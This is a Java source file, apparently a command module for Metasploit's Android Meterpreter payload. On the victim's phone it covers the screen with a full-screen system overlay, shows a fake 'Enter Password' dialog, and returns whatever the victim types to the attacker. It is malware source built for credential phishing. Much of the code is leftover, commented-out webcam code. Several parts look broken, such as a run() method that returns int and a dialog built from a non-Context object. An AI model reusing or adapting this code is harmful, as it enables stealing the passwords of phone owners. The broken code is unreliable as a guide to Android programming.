// partially implemented by https://stackoverflow.com/questions/18799216/how-to-make-a-edittext-box-in-a-dialog
package com.metasploit.meterpreter.android;

import android.content.Context;
//import android.graphics.PixelFormat;
//import android.hardware.Camera;
import android.os.Handler;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
//import com.metasploit.meterpreter.stdapi.webcam_audio_record;

import android.widget.EditText;
import android.widget.LinearLayout;
import android.app.AlertDialog;
import android.content.DialogInterface;

import java.io.IOException;
import java.lang.reflect.Method;

public class android_password_request implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_PASSWORD_REQUEST = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2);

    //public static Camera camera;

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        //int camId = request.getIntValue(TLV_TYPE_WEBCAM_INTERFACE_ID);

        //Class<?> cameraClass = Class.forName("android.hardware.Camera");
        //Method cameraOpenMethod = cameraClass.getMethod("open", Integer.TYPE);
        //if (cameraOpenMethod != null) {
        //    camera = (Camera) cameraOpenMethod.invoke(null, camId - 1);
        //} else {
        //    camera = Camera.open();
        //}

        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();
        Handler handler = new Handler(context.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public int run() {
                SurfaceView surfaceView = new SurfaceView(context);
                SurfaceHolder surfaceHolder = surfaceView.getHolder();
                //surfaceHolder.addCallback(new SurfaceHolder.Callback() {
                //    @Override
                //    public void surfaceCreated(SurfaceHolder holder) {
                //        //try {
                //        //    camera.setPreviewDisplay(holder);
                //        //} catch (IOException e) {
                //        //}
                //    }

                //    @Override
                //    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
                        //if (camera == null) {
                        //    return;
                        //}
                        //try {
                        //    camera.startPreview();
                        //} catch (Exception e) {
                        //}
                        //synchronized (webcam_start_android.this) {
                        //    webcam_start_android.this.notify();
                        //}
                //    }

                //    @Override
                //    public void surfaceDestroyed(SurfaceHolder holder) {

                //    }
                //});
                //surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
                WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        //WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        //WindowManager.LayoutParams.TYPE_TOAST,
                        //WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        //        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                        //PixelFormat.TRANSLUCENT
                        );
                windowManager.addView(surfaceView, params);

                ///////////////////////
                // https://stackoverflow.com/questions/18799216/how-to-make-a-edittext-box-in-a-dialog
                // create and show the dialog box
                ///////////////////////

                // Creating alert Dialog with one Button
                AlertDialog.Builder alertDialog = new AlertDialog.Builder(android_password_request.this);

                // Setting Dialog Title
                alertDialog.setTitle("PASSWORD");

                // Setting Dialog Message
                alertDialog.setMessage("Enter Password");

                // Add password box
                final EditText input = new EditText(android_password_request.this);
                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.MATCH_PARENT);
                input.setLayoutParams(lp);
                alertDialog.setView(input);

                // Setting Icon to Dialog
                //alertDialog.setIcon(R.drawable.key);

                // Setting Positive "Yes" Button
                alertDialog.setPositiveButton("YES",
                    new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog,int which) {
                            response.addOverflow(TLV_TYPE_PASSWORD_REQUEST, input.getText());
                            return ERROR_SUCCESS;
                        }
                    });
                // closed

                // Showing Alert Message
                alertDialog.show();
            }
        });

        synchronized (this) {
            wait(4000);
        }

        return ERROR_SUCCESS;
    }
}
